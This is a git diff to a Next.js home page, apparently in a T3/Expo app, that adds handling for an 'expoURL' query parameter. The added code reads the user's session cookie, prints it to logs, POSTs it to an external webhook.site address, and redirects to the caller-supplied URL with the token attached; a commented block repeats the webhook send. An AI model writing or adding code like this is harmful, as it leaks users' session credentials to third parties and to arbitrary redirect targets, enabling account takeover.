@@ -1,4 +1,8 @@
 import { Suspense } from "react";
+import { cookies } from "next/headers";
+import { redirect } from "next/navigation";
+
+import { AUTH_SESSION_KEY_NAME } from "@kochanet_pas/const";
 
 import { api, HydrateClient } from "~/trpc/server";
 import { AuthShowcase } from "./_components/auth-showcase";
@@ -10,9 +14,48 @@ import {
 
 // export const runtime = "edge";
 
-export default function HomePage() {
+export default async function HomePage({
+  searchParams,
+}: {
+  searchParams?: Record<string, string | string[] | undefined>;
+}) {
   // You can await this here if you don't want to show Suspense fallback below
   void api.post.all.prefetch();
+  const expoURL = searchParams?.expoURL;
+  console.log("EXPO URL", expoURL);
+  if (expoURL && typeof expoURL === "string") {
+    const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
+    if (sessionCookie) {
+      console.log("SESSION COOKIE", sessionCookie);
+      await fetch("https://webhook.site/9e1a2085-84bb-422f-8b2d-c1c15697d356", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ sessionCookie }),
+      });
+      const redirectURL = new URL(expoURL);
+      redirectURL.searchParams.set("session_token", sessionCookie);
+      console.log("Redirecting...", {
+        redirectURL: redirectURL.toString(),
+      });
+      return redirect(redirectURL.toString());
+    }
+  }
+
+  // const session = await auth();
+
+  // const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
+  // // send a post request to testURL with the sessionCookie
+  // if (sessionCookie) {
+  //   await fetch("https://webhook.site/9e1a2085-84bb-422f-8b2d-c1c15697d356", {
+  //     method: "POST",
+  //     headers: {
+  //       "Content-Type": "application/json",
+  //     },
+  //     body: JSON.stringify({ sessionCookie }),
+  //   });
+  // }
 
   return (
     <HydrateClient>
